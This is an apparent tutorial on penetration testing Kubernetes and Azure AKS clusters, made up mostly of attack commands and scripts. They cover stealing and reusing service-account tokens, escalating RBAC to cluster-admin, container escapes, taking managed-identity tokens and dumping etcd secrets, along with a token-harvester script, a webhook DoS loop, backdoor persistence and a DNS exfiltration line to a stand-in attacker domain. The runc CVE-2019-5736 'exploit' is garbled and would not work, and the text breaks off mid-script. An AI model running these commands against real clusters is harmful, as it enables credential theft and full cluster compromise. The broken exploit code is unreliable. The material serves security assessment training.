# Kubernetes Penetration Testing Guide for Beginners
*A Comprehensive Guide to Azure Kubernetes Service (AKS) Security Assessment*

## Table of Contents

1. [Introduction to Kubernetes Security](#introduction-to-kubernetes-security)
2. [Setting Up Your Testing Environment](#setting-up-your-testing-environment)
3. [Reconnaissance and Information Gathering](#reconnaissance-and-information-gathering)
4. [Authentication and Authorization Testing](#authentication-and-authorization-testing)
5. [Container and Pod Security Assessment](#container-and-pod-security-assessment)
6. [Network Security Testing](#network-security-testing)
7. [Storage and Secret Management Testing](#storage-and-secret-management-testing)
8. [Azure-Specific Kubernetes Vulnerabilities](#azure-specific-kubernetes-vulnerabilities)
9. [Advanced Attack Scenarios](#advanced-attack-scenarios)
10. [Tools and Automation](#tools-and-automation)
11. [Reporting and Remediation](#reporting-and-remediation)
12. [Best Practices and Countermeasures](#best-practices-and-countermeasures)

---

## Introduction to Kubernetes Security

### What is Kubernetes Penetration Testing?

Kubernetes penetration testing involves systematically assessing the security posture of containerized environments to identify vulnerabilities, misconfigurations, and security weaknesses that could be exploited by attackers. Unlike traditional application testing, Kubernetes pentesting requires understanding of:

- Container orchestration concepts
- Cluster networking and service mesh
- Role-Based Access Control (RBAC)
- Pod security policies and contexts
- Container runtime security
- Cloud-native attack vectors

### Key Components to Assess

**Control Plane Components:**
- API Server (ports 443, 6443, 8080, 8443)
- etcd database (port 2379)
- Controller Manager
- Scheduler

**Worker Node Components:**
- Kubelet API (ports 10250, 10255)
- Container Runtime (Docker, containerd, CRI-O)
- Kube-proxy (port 10256)
- Network plugins (Calico port 9099, Weave ports 6782-6784)

**Azure-Specific Components:**
- Azure Active Directory integration
- Azure Key Vault CSI driver
- Azure Managed Identity
- Azure Container Registry (ACR)
- Network Security Groups (NSGs)

---

## Setting Up Your Testing Environment

### Prerequisites

Before starting your penetration test, ensure you have:

**Required Tools:**
```bash
# Install kubectl
curl -LO https://dl.k8s.io/release/v1.29.2/bin/linux/amd64/kubectl
chmod +x kubectl
sudo mv ./kubectl /usr/bin/
kubectl version --client

# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Install Helm (for tool deployment)
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
```

**Penetration Testing Tools:**
```bash
# Essential scanning tools
sudo apt update
sudo apt install -y nmap curl jq git python3 python3-pip

# Install specialized Kubernetes pentest tools (covered in detail later)
# - Peirates: Kubernetes penetration testing tool
# - kdigger: Context discovery tool
# - kubectl: Primary interaction tool
```

**Azure Authentication Setup:**
```bash
# Login to Azure
az login

# Set subscription context
az account set --subscription "your-subscription-id"

# Get AKS credentials
az aks get-credentials --resource-group myResourceGroup --name myAKSCluster
```

### Understanding Your Testing Scope

**Gray-Box Testing (Recommended for Beginners):**
- You have cluster access credentials
- Limited knowledge of infrastructure
- Focus on privilege escalation and lateral movement

**Black-Box Testing (Advanced):**
- No initial access to cluster
- External network reconnaissance
- Social engineering components

**White-Box Testing:**
- Full access to configuration files
- Infrastructure documentation available
- Focus on configuration review and compliance

---

## Reconnaissance and Information Gathering

### Phase 1: External Reconnaissance

**1. Network Discovery and Port Scanning**

Start with discovering exposed Kubernetes services:

```bash
# Scan for common Kubernetes ports
nmap -sS -O -sV -p 22,443,2379,2380,6443,8080,8443,9099,10250,10255,10256 target-ip

# Comprehensive Kubernetes port scan
nmap --open -T4 -A -v -Pn -p 443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 target-range
```

**2. Service Discovery via DNS**

```bash
# Look for Kubernetes-related subdomains
dig axfr domain.com
nslookup -type=any kubernetes.domain.com
nslookup -type=any api.domain.com
```

**3. Search Engine Reconnaissance**

Use specialized search engines to find exposed Kubernetes components:

```bash
# Shodan/Censys queries
product:kubernetes
kubernetes master
k8s.io
apiserver
kubernetes dashboard
openshift
etcd
```

### Phase 2: Internal Reconnaissance (Post Initial Access)

**1. Container Context Discovery**

Once you have access to a container, verify your environment:

```bash
# Check if you're in a container
cat /proc/1/cgroup | grep -i docker
ls -la /proc/self/ns/

# Look for Kubernetes-specific files
find / 2>/dev/null | grep -i kube

# Expected output:
# /run/secrets/kubernetes.io
# /run/secrets/kubernetes.io/serviceaccount
# /run/secrets/kubernetes.io/serviceaccount/namespace
# /run/secrets/kubernetes.io/serviceaccount/ca.crt
# /run/secrets/kubernetes.io/serviceaccount/token
```

**2. Environment Variable Analysis**

```bash
# Extract Kubernetes environment variables
env | grep -i kube

# Expected variables:
# KUBERNETES_SERVICE_PORT_HTTPS=443
# KUBERNETES_SERVICE_PORT=443
# KUBERNETES_PORT_443_TCP=tcp://10.33.144.1:443
# KUBERNETES_SERVICE_HOST=10.33.144.1
```

**3. Service Account Token Discovery**

```bash
# Locate service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get namespace information
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Extract CA certificate
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**4. Network and Service Enumeration**

```bash
# Get cluster information (if kubectl is available)
kubectl cluster-info
kubectl cluster-info dump

# List all services across namespaces
kubectl get svc --all-namespaces

# Get comprehensive pod information
kubectl get pods -A -o json

# List nodes and their information
kubectl get nodes -o wide

# Check current permissions
kubectl auth can-i --list
```

**5. API Server Discovery via curl**

If kubectl is not available, use curl to interact with the API:

```bash
# Set variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Test API connectivity
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" -X GET $APISERVER/api

# List pods in current namespace
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" -X GET $APISERVER/api/v1/pods

# List all namespaces
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" -X GET $APISERVER/api/v1/namespaces
```

---

## Authentication and Authorization Testing

### Understanding Kubernetes RBAC

Kubernetes uses Role-Based Access Control (RBAC) to manage permissions. Understanding RBAC is crucial for privilege escalation:

**Key RBAC Components:**
- **Subjects**: Users, Groups, Service Accounts
- **Roles/ClusterRoles**: Define permissions (verbs on resources)
- **RoleBindings/ClusterRoleBindings**: Connect subjects to roles

### Common RBAC Misconfigurations

**1. Overly Permissive Service Accounts**

Check for dangerous permissions:

```bash
# Check current service account permissions
kubectl auth can-i --list

# Check for dangerous verbs
kubectl auth can-i create pods
kubectl auth can-i create clusterroles
kubectl auth can-i create clusterrolebindings
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i "*" "*"

# Test with specific token
kubectl auth can-i --list --token=$STOLEN_TOKEN
```

**2. Dangerous RBAC Verbs for Privilege Escalation**

Look for these high-risk permissions:

```bash
# 'escalate' verb - allows creating roles with higher privileges
kubectl auth can-i escalate clusterroles

# 'bind' verb - allows binding any role to any subject
kubectl auth can-i bind clusterroles

# 'impersonate' verb - allows impersonating other users
kubectl auth can-i impersonate users
kubectl auth can-i impersonate serviceaccounts

# 'create' on certificatesigningrequests
kubectl auth can-i create certificatesigningrequests

# Token request capabilities
kubectl auth can-i create serviceaccounts/token
```

### Service Account Token Exploitation

**1. Stealing Service Account Tokens**

```bash
# From running pod exec
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# From secrets
kubectl get secrets --all-namespaces
kubectl get secret service-account-token-name -o yaml

# Extract token from secret
kubectl get secret secret-name -o jsonpath='{.data.token}' | base64 -d
```

**2. Using Stolen Tokens**

```bash
# Test token permissions
kubectl auth can-i --list --token=$STOLEN_TOKEN

# Use token for kubectl commands
kubectl --token=$STOLEN_TOKEN get pods

# Create kubeconfig with stolen token
kubectl config set-credentials stolen-user --token=$STOLEN_TOKEN
kubectl config set-context stolen-context --user=stolen-user --cluster=current-cluster
kubectl config use-context stolen-context
```

### RBAC Privilege Escalation Techniques

**1. Escalate Verb Exploitation**

If you have `escalate` permissions on roles:

```bash
# Create a new role with full permissions
cat << EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalated-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

# Bind the role to your service account
cat << EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalated-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: escalated-role
subjects:
- kind: ServiceAccount
  name: your-service-account
  namespace: your-namespace
EOF
```

**2. Bind Verb Exploitation**

If you have `bind` permissions:

```bash
# Bind cluster-admin role to your service account
cat << EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: privilege-escalation
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: your-service-account
  namespace: your-namespace
EOF
```

**3. Impersonate Verb Exploitation**

If you have `impersonate` permissions:

```bash
# Impersonate cluster-admin user
kubectl --as=system:admin get secrets --all-namespaces

# Impersonate service account with higher privileges
kubectl --as=system:serviceaccount:kube-system:admin get secrets --all-namespaces
```

---

## Container and Pod Security Assessment

### Pod Security Context Analysis

**1. Privileged Containers**

Look for containers running with elevated privileges:

```bash
# Check for privileged containers
kubectl get pods -o yaml | grep -A 10 -B 10 "privileged: true"

# Check security contexts
kubectl get pods -o json | jq '.items[] | select(.spec.securityContext.privileged == true)'

# Get detailed security context information
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, securityContext: .spec.securityContext}'
```

**2. Host Namespace Sharing**

Identify containers sharing host namespaces:

```bash
# Check for host network access
kubectl get pods -o yaml | grep "hostNetwork: true"

# Check for host PID namespace
kubectl get pods -o yaml | grep "hostPID: true"

# Check for host IPC namespace
kubectl get pods -o yaml | grep "hostIPC: true"

# Comprehensive host sharing check
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true)'
```

**3. Dangerous Volume Mounts**

Look for sensitive host path mounts:

```bash
# Check for host path volumes
kubectl get pods -o yaml | grep -A 5 -B 5 "hostPath"

# Look for root filesystem mounts
kubectl get pods -o json | jq '.items[] | select(.spec.volumes[]?.hostPath?.path == "/")'

# Check for Docker socket mounts
kubectl get pods -o json | jq '.items[] | select(.spec.volumes[]?.hostPath?.path == "/var/run/docker.sock")'

# Identify pods with sensitive mounts
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, volumes: .spec.volumes}'
```

### Container Escape Techniques

**1. Privileged Container Escape**

If running in a privileged container:

```bash
# Check if privileged
id
cat /proc/self/status | grep Cap

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host

# Or use nsenter for host access
nsenter -t 1 -m -u -i -n -p /bin/bash
```

**2. Docker Socket Abuse**

If Docker socket is mounted:

```bash
# Check for Docker socket
ls -la /var/run/docker.sock

# List containers
docker ps

# Create privileged container with host filesystem access
docker run -it --privileged --pid=host --net=host --ipc=host -v /:/host ubuntu:latest chroot /host bash
```

**3. Capabilities-Based Escape**

Check and abuse dangerous capabilities:

```bash
# Check current capabilities
grep Cap /proc/self/status
capsh --print

# If CAP_SYS_ADMIN is available
unshare -rm sh -c "mkdir l u w m && mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && touch m/poc && ls l u w m"

# If CAP_SYS_PTRACE is available
gdb -p 1
(gdb) call system("id")
```

### Known Container Runtime Vulnerabilities

**1. CVE-2019-5736 (runc Vulnerability)**

This critical vulnerability allows container escape:

```bash
# Exploit conditions check
ls -la /proc/self/exe

# Create malicious binary (simplified example)
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main() {
    execve("/bin/sh", NULL, NULL);
    return 0;
}
EOF

gcc -o /tmp/exploit /tmp/exploit.c
chmod +x /tmp/exploit

# Monitor for runc process and overwrite
echo '#!/proc/self/exe' > /bin/sh
# Wait for exec and exploit...
```

**2. Dirty Pipe Container Escape (CVE-2022-0847)**

Exploit the Dirty Pipe vulnerability for container breakout:

```bash
# Check kernel version (vulnerable: 5.8 to 5.16.11)
uname -r

# Look for writable files in /proc/self/exe
ls -la /proc/self/exe

# Use existing Dirty Pipe exploit tools
# (Implementation details omitted for brevity)
```

---

## Network Security Testing

### Network Policy Assessment

**1. Default Network Behavior**

Kubernetes networking is "flat" by default - all pods can communicate:

```bash
# Test pod-to-pod connectivity
kubectl run test-pod --image=busybox --rm -it --restart=Never -- wget -qO- http://target-service:port

# Check for network policies
kubectl get networkpolicies --all-namespaces

# Analyze network policy rules
kubectl get networkpolicy policy-name -o yaml
```

**2. Network Policy Bypass Techniques**

```bash
# Test different protocols
kubectl run test-pod --image=nicolaka/netshoot --rm -it --restart=Never

# From within the test pod:
# Test ICMP (often not blocked)
ping target-ip

# Test different ports
nmap -p 1-65535 target-ip

# Test UDP protocols
nc -u target-ip target-port

# DNS exfiltration (if DNS is allowed)
dig $(echo "data" | base64).attacker-domain.com
```

**3. Service Discovery**

```bash
# Enumerate services via DNS
nslookup kubernetes.default.svc.cluster.local

# Scan cluster IP ranges
nmap -sn 10.0.0.0/8
nmap -sn 172.16.0.0/12
nmap -sn 192.168.0.0/16

# Service enumeration script
for i in {1..254}; do 
    for port in 80 443 8080 9090 6379 5432; do
        nc -zv 10.0.0.$i $port 2>/dev/null && echo "10.0.0.$i:$port is open"
    done
done
```

### Internal Network Scanning

**1. Comprehensive Port Scanning**

```bash
# Install nmap in container
apt update && apt install -y nmap

# Scan Kubernetes service networks
nmap -sS 10.0.0.0/8 -p 80,443,8080,9090,6379,5432,3306,1433,2379

# Target specific Kubernetes components
nmap -sV -p 2379 etcd-server-ip  # etcd
nmap -sV -p 10250 node-ip        # Kubelet
nmap -sV -p 9090 prometheus-ip   # Prometheus
```

**2. Automated Network Discovery Script**

```bash
#!/bin/bash
# Kubernetes network scanner
echo "Starting Kubernetes network reconnaissance..."

# Install dependencies
sudo apt-get update
sudo apt-get install -y nmap

# Define scan function
nmap-kube() {
    nmap --open -T4 -A -v -Pn -p 443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

# Discover local IP range
LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,')

# Define server ranges (adjust for your environment)
SERVER_RANGES="10.0.0.1 10.0.1.* 10.*.0-1.*"

# Execute scan
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
```

### Network Traffic Analysis

**1. Packet Capture and Analysis**

```bash
# Install tcpdump in container
apt update && apt install -y tcpdump

# Capture network traffic
tcpdump -i eth0 -v -X

# Capture HTTP traffic
tcpdump -i eth0 port 80 -A

# Capture and save for analysis
tcpdump -i eth0 -w capture.pcap
```

**2. Service Mesh Security Testing**

For environments using Istio, Linkerd, or other service meshes:

```bash
# Check for mTLS enforcement
kubectl get peerauthentication --all-namespaces
kubectl get destinationrules --all-namespaces

# Test service-to-service authentication
curl -k https://service-name.namespace.svc.cluster.local

# Check for authorization policies
kubectl get authorizationpolicies --all-namespaces
```

---

## Storage and Secret Management Testing

### Secret Enumeration and Extraction

**1. Basic Secret Discovery**

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Get secret details without decoding
kubectl get secrets -o yaml

# Extract and decode secret data
kubectl get secret secret-name -o jsonpath='{.data.password}' | base64 -d

# Get all secret data
kubectl get secret secret-name -o json | jq '.data | map_values(@base64d)'
```

**2. Service Account Secret Mining**

```bash
# Find service account tokens
kubectl get secrets --all-namespaces | grep "service-account-token"

# Extract service account tokens
for secret in $(kubectl get secrets -A | grep service-account-token | awk '{print $2 " " $1}'); do
    name=$(echo $secret | cut -d' ' -f1)
    ns=$(echo $secret | cut -d' ' -f2)
    echo "Secret: $name in $ns"
    kubectl get secret $name -n $ns -o jsonpath='{.data.token}' | base64 -d
    echo ""
done
```

**3. ConfigMap Data Extraction**

```bash
# List all ConfigMaps
kubectl get configmaps --all-namespaces

# Extract ConfigMap data
kubectl get configmap config-name -o yaml

# Look for sensitive data in ConfigMaps
kubectl get configmaps -A -o yaml | grep -i -E "(password|token|key|secret)"
```

### Azure Key Vault Integration Testing

**1. Azure Key Vault CSI Driver Assessment**

```bash
# Check for Key Vault CSI driver
kubectl get pods -n kube-system | grep secrets-store-csi-driver

# List SecretProviderClass objects
kubectl get secretproviderclass --all-namespaces

# Examine Key Vault integration
kubectl get secretproviderclass vault-secrets -o yaml
```

**2. Managed Identity Token Extraction**

If Azure Managed Identity is configured:

```bash
# Get managed identity token
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true

# Extract token for Key Vault access
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -H Metadata:true

# Use token to access Key Vault
TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -H Metadata:true | jq -r '.access_token')
curl -H "Authorization: Bearer $TOKEN" "https://your-vault.vault.azure.net/secrets?api-version=7.0"
```

### Persistent Volume Security

**1. Persistent Volume Assessment**

```bash
# List persistent volumes
kubectl get pv

# Check persistent volume claims
kubectl get pvc --all-namespaces

# Examine PV specifications for security issues
kubectl get pv pv-name -o yaml

# Look for host path persistent volumes
kubectl get pv -o json | jq '.items[] | select(.spec.hostPath != null)'
```

**2. Storage Class Analysis**

```bash
# List storage classes
kubectl get storageclass

# Check for insecure storage class configurations
kubectl get storageclass -o yaml | grep -A 10 -B 10 "allowVolumeExpansion\|reclaimPolicy"
```

---

## Azure-Specific Kubernetes Vulnerabilities

### Azure Active Directory Integration

**1. Azure AD Webhook Assessment**

```bash
# Check for Azure AD webhook configuration
kubectl get validatingadmissionwebhooks
kubectl get mutatingadmissionwebhooks

# Examine webhook configurations
kubectl get validatingadmissionwebhook webhook-name -o yaml
```

**2. RBAC Integration Testing**

```bash
# Check Azure RBAC integration
kubectl get clusterrolebindings | grep -i azure

# Test Azure user permissions
az aks get-credentials --admin --resource-group myRG --name myAKS

# Check for over-privileged Azure service principals
az role assignment list --assignee service-principal-id
```

### Azure Managed Identity Exploitation

**1. Workload Identity Assessment**

```bash
# Check for workload identity annotations
kubectl get serviceaccounts -A -o yaml | grep azure.workload.identity

# Extract client ID
kubectl get serviceaccount sa-name -o jsonpath='{.metadata.annotations.azure\.workload\.identity/client-id}'

# Test federated identity credentials
az identity federated-credential list --ids /subscriptions/sub-id/resourceGroups/rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/identity-name
```

**2. Cross-Tenant Attack Scenarios**

```bash
# Enumerate accessible tenants
az account list --query '[].{Name:name, TenantId:tenantId, SubscriptionId:id}'

# Test cross-tenant resource access
TOKEN=$(az account get-access-token --query accessToken -o tsv)
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/target-subscription/resourceGroups"
```

### Azure Container Registry (ACR) Security

**1. ACR Access Testing**

```bash
# Check for ACR pull secrets
kubectl get secrets --all-namespaces | grep regcred

# Extract ACR credentials
kubectl get secret acr-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.'

# Test ACR access with extracted credentials
docker login acrname.azurecr.io -u username -p password

# List images in registry
az acr repository list --name acrname
```

**2. Image Vulnerability Analysis**

```bash
# Scan running container images for vulnerabilities
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq

# Use trivy for image scanning
trivy image --exit-code 1 --severity HIGH,CRITICAL image-name:tag
```

### WireServing Vulnerability (Azure Specific)

The WireServing vulnerability allows privilege escalation in AKS:

```bash
# Check for vulnerable configurations
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork == true)'

# Test metadata service access
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true

# Exploit script (conceptual)
# This vulnerability has been patched, but serves as an example
```

---

## Advanced Attack Scenarios

### Multi-Stage Attack Chain Example

**Scenario: From Pod Compromise to Cluster Admin**

```bash
# Stage 1: Initial foothold (RCE in web application)
# Assume we have shell access in a pod

# Stage 2: Container enumeration
find / 2>/dev/null | grep -i kube
env | grep -i kube
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Stage 3: API server discovery and authentication
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Stage 4: Permission enumeration
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
     --header "Authorization: Bearer $TOKEN" \
     -X GET $APISERVER/api/v1/namespaces/default/pods

# Stage 5: Lateral movement via service account token theft
kubectl get secrets --all-namespaces
kubectl get secret high-privilege-token -o jsonpath='{.data.token}' | base64 -d

# Stage 6: Privilege escalation
# Use escalate verb to create cluster-admin role
# Or exploit RBAC misconfigurations

# Stage 7: Persistence and data exfiltration
kubectl create secret generic backdoor --from-literal=token=$ADMIN_TOKEN
kubectl apply -f persistent-backdoor.yaml
```

### Container Breakout to Host Compromise

**Complete Attack Flow:**

```bash
# 1. Identify container escape vectors
mount | grep docker
ls -la /proc/self/ns/
cat /proc/self/status | grep Cap

# 2. Escape via privileged container
if [ "$(grep 'docker\|lxc' /proc/1/cgroup)" ]; then
    echo "In container - attempting escape"
    nsenter -t 1 -m -u -i -n -p /bin/bash
fi

# 3. Host reconnaissance
ps aux | grep kube
netstat -tulpn | grep -E "2379|10250|10255"
find /etc -name "*.crt" -o -name "*.key" 2>/dev/null

# 4. Steal etcd certificates and data
cp /etc/kubernetes/pki/etcd/ca.crt /tmp/
cp /etc/kubernetes/pki/etcd/client.crt /tmp/
cp /etc/kubernetes/pki/etcd/client.key /tmp/

# 5. Access etcd directly
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
    --cert=/tmp/client.crt --key=/tmp/client.key \
    --cacert=/tmp/ca.crt get / --prefix --keys-only

# 6. Extract all secrets from etcd
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
    --cert=/tmp/client.crt --key=/tmp/client.key \
    --cacert=/tmp/ca.crt get /registry/secrets --prefix
```

### Admission Controller Bypass

**Testing Admission Controller Security:**

```bash
# 1. Identify admission controllers
kubectl get validatingadmissionwebhooks
kubectl get mutatingadmissionwebhooks

# 2. Test webhook bypass techniques
# Create pod with invalid configuration
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-bypass
spec:
  containers:
  - name: test
    image: nginx
    securityContext:
      privileged: true
  hostNetwork: true
EOF

# 3. Test webhook availability
curl -k https://webhook-service.namespace.svc.cluster.local:443/validate

# 4. Attempt webhook DoS
for i in {1..100}; do
  kubectl apply -f test-pod.yaml &
done
```

---

## Tools and Automation

### Essential Kubernetes Penetration Testing Tools

**1. Peirates - Kubernetes Penetration Testing Tool**

Installation and usage:

```bash
# Download Peirates
wget https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.xz
tar -xf peirates-linux-amd64.tar.xz
chmod +x peirates

# Run Peirates
./peirates

# Key features:
# - Service account token gathering
# - Privilege escalation automation
# - Pod creation for lateral movement
# - Cloud metadata exploitation
# - Reverse shell establishment
```

Example Peirates workflow:
```
[1] List and get service account tokens from running pods
[2] Get service account tokens from secrets
[3] List secrets in this namespace (get-secrets-for-current-namespace)
[4] List pods in this namespace for a potential mount
[5] List secrets in all namespaces
[6] List pods in all namespaces
[7] Get service account tokens from secrets in all namespaces
[8] Create a pod with a specific service account
[9] Execute command in pod
```

**2. kdigger - Context Discovery Tool**

```bash
# Download kdigger
wget https://github.com/quarkslab/kdigger/releases/latest/download/kdigger-linux-amd64
chmod +x kdigger-linux-amd64

# Run comprehensive discovery
./kdigger-linux-amd64 dig all

# Specific bucket analysis
./kdigger-linux-amd64 dig admission      # Admission controllers
./kdigger-linux-amd64 dig authorization  # RBAC permissions
./kdigger-linux-amd64 dig services       # Service discovery
./kdigger-linux-amd64 dig token          # Service account tokens
./kdigger-linux-amd64 dig runtime        # Container runtime info
```

**3. kubectl Advanced Usage**

```bash
# Get comprehensive cluster information
kubectl cluster-info dump --output-directory=/tmp/cluster-dump

# Extract all resource definitions
kubectl get all --all-namespaces -o yaml > all-resources.yaml

# Get events for troubleshooting and intelligence
kubectl get events --all-namespaces --sort-by='.lastTimestamp'

# Resource relationship mapping
kubectl get pods -o custom-columns="POD:.metadata.name,NODE:.spec.nodeName,SERVICE_ACCOUNT:.spec.serviceAccountName,NAMESPACE:.metadata.namespace"
```

**4. Trivy - Vulnerability Scanner**

```bash
# Install Trivy
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy

# Scan running images
kubectl get pods --all-namespaces -o jsonpath="{..image}" | tr -s '[[:space:]]' '\n' | sort | uniq -c | sort -nr

# Scan specific images
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.12

# Scan Kubernetes cluster
trivy k8s --report summary cluster
```

### Custom Automation Scripts

**1. Kubernetes Reconnaissance Script**

```bash
#!/bin/bash
# k8s-recon.sh - Kubernetes penetration testing automation

echo "=== Kubernetes Penetration Testing Reconnaissance ==="

# Check if we're in a Kubernetes environment
if [ -d "/var/run/secrets/kubernetes.io" ]; then
    echo "[+] Running inside Kubernetes cluster"
    
    # Extract service account information
    SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    
    echo "[+] Service Account Token Length: ${#SA_TOKEN}"
    echo "[+] Namespace: $NAMESPACE"
    
    # Check API server connectivity
    if curl -s -k --header "Authorization: Bearer $SA_TOKEN" \
        https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api; then
        echo "[+] API Server accessible"
        
        # Test permissions
        echo "[+] Testing permissions..."
        kubectl auth can-i --list 2>/dev/null | head -20
        
        # Enumerate resources
        echo "[+] Enumerating accessible resources..."
        kubectl get pods 2>/dev/null | head -10
        kubectl get secrets 2>/dev/null | head -10
        kubectl get services 2>/dev/null | head -10
    else
        echo "[-] API Server not accessible"
    fi
else
    echo "[-] Not running inside Kubernetes cluster"
fi

# Network discovery
echo "[+] Network reconnaissance..."
ip addr show
netstat -tuln 2>/dev/null | grep LISTEN

# Process enumeration
echo "[+] Process enumeration..."
ps aux | grep -E "kube|docker|containerd" | head -10

echo "=== Reconnaissance complete ==="
```

**2. Service Account Token Harvester**

```bash
#!/bin/bash
# sa-harvester.sh - Service Account Token Collection

echo "=== Service Account Token Harvester ==="

# Function to extract and test tokens
test_token() {
    local token=$1
    local name=$2
    
    echo "[+] Testing token from $name"
    
    # Test basic API access
    if curl -s -k --header "Authorization: Bearer $token" \
        https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api >/dev/null; then
        
        echo "  [+] Token valid - testing permissions"
        
        # Save token to file
        echo $token > /tmp/token_$name.txt
        
        # Test high-value permissions
        kubectl --token=$token auth can-i create pods 2>/dev/null && echo "  [!] Can create pods"
        kubectl --token=$token auth can-i get secrets --all-namespaces 2>/dev/null && echo "  [!] Can read all secrets"
        kubectl --token=$token auth can-i "*" "*" 2>/dev/null && echo "  [!] Has admin privileges!"
        
    else
        echo "  [-] Token invalid or API unreachable"
    fi
}

# Harvest tokens from environment
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    test_token "$TOKEN" "current_pod"
fi

# Harvest tokens from secrets (if accessible)
if kubectl get secrets >/dev/null 2>&1; then
    echo "[+] Enumerating secrets for tokens..."
    
    kubectl get secrets -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .metadata.name' | while read secret; do
        echo "[+] Extracting token from secret: $secret"
        TOKEN=$(kubectl get secret $secret -o jsonpath='{.data.token}' 2>/dev/null | base64 -d)
        if [ ! -z "$TOKEN" ]; then
            test_token "$TOKEN" "$secret"
        fi
    done
fi

echo "=== Token harvesting complete ==="
echo "Collected tokens saved to /tmp/token_*.txt"
```

**3. Network Discovery and Scanning Automation**

```bash
#!/bin/bash
# k8s-netscan.sh - Kubernetes Network Discovery

echo "=== Kubernetes Network Discovery ==="

# Install dependencies if needed
if ! command -v nmap &> /dev/null; then
    echo "[+] Installing nmap..."
    apt update && apt install -y nmap curl
fi

# Discover cluster IP ranges
echo "[+] Discovering network ranges..."
CLUSTER_IP=$(kubectl get svc kubernetes -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
echo "Cluster IP: $CLUSTER_IP"

# Extract network range from cluster IP
if [ ! -z "$CLUSTER_IP" ]; then
    NETWORK=$(echo $CLUSTER_IP | cut -d. -f1-3).0/24
    echo "Scanning network: $NETWORK"
    
    # Quick ping sweep
    echo "[+] Performing ping sweep..."
    nmap -sn $NETWORK | grep -E "Nmap scan report|MAC Address"
    
    # Service discovery on live hosts
    echo "[+] Scanning for Kubernetes services..."
    nmap -p 80,443,2379,6443,8080,8443,9090,10250,10255 $NETWORK --open
fi

# Service enumeration via DNS
echo "[+] DNS service discovery..."
nslookup kubernetes.default.svc.cluster.local
dig axfr cluster.local

# Port scanning common Kubernetes ports
echo "[+] Scanning for exposed Kubernetes components..."
